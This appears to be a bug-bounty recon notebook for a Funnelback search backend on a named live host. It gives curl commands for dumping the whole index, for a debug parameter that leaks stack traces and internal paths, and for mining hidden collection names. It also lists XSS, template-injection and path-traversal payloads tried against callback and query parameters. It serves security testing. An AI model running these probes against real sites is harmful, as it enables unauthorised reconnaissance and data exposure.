# Funnelback Search Backend — Recipes (verified on racv-search.funnelback.squiz.cloud)

## Discover the endpoint
On every page of the site, the search box HTML carries the backend:
```html
<input id="search_box" data-ajax-list="https://<x>-search.funnelback.squiz.cloud/s/suggest.json?collection=<coll>&fmt=json++&alpha=0.5&profile=auto-completion"
 data-ajax-list-suggestion="...profile=_default" data-funnelback-host="https://<x>-search.funnelback.squiz.cloud" data-submit-url="/search-results.html">
```
Grep page HTML for `data-ajax-list`, `data-ajax-list-suggestion`, `data-funnelback-host`.

## Full index dump — ONE request (no pagination needed)
```bash
# num_ranks=9999 returns EVERYTHING in a single JSON (3-6 MB for site-scale)
curl -s "https://racv-search.funnelback.squiz.cloud/s/search.json?collection=racv~sp-search&query=a&fmt=json&num_ranks=9999" \
 | grep -o '"liveUrl":"[^"]*"' | sed 's/"liveUrl":"//;s/"$//' > all_indexed_urls.txt
```
- `query=a` returns the most (any single letter); `query=*` alone returned 0 URLs — use a letter.
- Pagination alternative that works: `num_ranks=200&start_rank=N` stepping by 200. `rank`, `page`, `offset`, `s.rank` all silently return page 1 — always verify page 2 differs before trusting a paginator.
- Then: `diff <(sort all_indexed_urls.txt) <(grep -o '<loc>[^<]*' sitemap.xml | sed 's/<loc>//' | sort)` → indexed-but-not-sitemapped HTML pages = hidden/unpublished content lead. PDFs are usually compliance docs (PDS/TMD/WGEA/annual reports) — check, but not findings by themselves.

## Debug leak — 127KB internal disclosure in one param
```bash
curl -s "https://racv-search.funnelback.squiz.cloud/s/search.json?collection=racv~sp-search&query=insurance&fmt=json&debug=1"
```
- HTTP 500, content-type `application/json`, ~127KB.
- Contains: full Java stack traces (Spring MVC, Log4jServletFilter class names, `java.xml` module 11.0.7), `environmentVariables` (REMOTE_ADDR, REQUEST_URL), internal paths (`/opt/funnelback/data/<coll>/live/log/queries-qp01-pd03-az03-prd-au.log`, `/opt/funnelback/bin/padre-sw`), query-processor options, and **undocumented collection names** (`racv~ds-web`).
- `debug=true` is benign (only adds `question.additionalParameters.debug`); `debug=1` is the leak.
- Mine the leak for collection names, then probe them: `racv~ds-web` → 403 = protected/internal collection (name = intel, no access). Valid public collections return 200 JSON; invalid → 400.
- The leak lives on the VENDOR domain (`.funnelback.squiz.cloud`) → usually out of bounty scope; treat as recon intel, not a submittable finding.

## JSONP callback grammar (why the XSS fails)
`callback=` reflects only grammar-valid JS identifier chains:
- OK → 200, content-type `application/javascript`, body `/**/<callback>({...})`, callback echoed verbatim:
  `cb`, `_`, `$`, `a.b`, `jQuery`, `$.get`, `require`, `process`, `this`, `top`, `parent`
- BLOCKED → 400 (error page) or 403 (WAF):
  `alert(1)`, `a['b']`, `window['alert']`, `` alert`1` ``, `al\x65rt(1)`, `al\u0065rt(1)`, `'alert'(1)`, `` ``['alert']``(1) ``, `alert\n(1)`, `x;alert(1)//`, `onerror=alert(1)`
- Some payloads returned 400 (invalid arg) vs 403 (WAF) — both are blocks. A `200` with the callback verbatim in an `application/javascript` response with `/**/` prefix = reflected; only payloads that stay identifier-grammar are reflected, and those can't execute.
- Query reflection: `{{7*7}}` / `${7*7}` reflect into `question.originalQuery` JSON string (200); `<script>` etc → WAF 403. HTML output (`/s/search.html`) reflects in escaped/error contexts only. No XSS sink found on this target.

## Other params worth fuzzing (quick matrix)
`profile` (valid: `_default`, `auto-completion`; `../../../etc/passwd` → 400), `collection` (`*` → 400), `sort` (date/relevance OK), `partial_query`, `alpha`, `fmo`, `fmt` (json/xml/html all return), `showall`, `f.profile=*`, `preview=true`, `all=true`, `admin=true` (all OK/ignored), `num_ranks=9999` (full dump), `debug=1` (leak). `/s/redirect?url=` → 400 (no open redirect).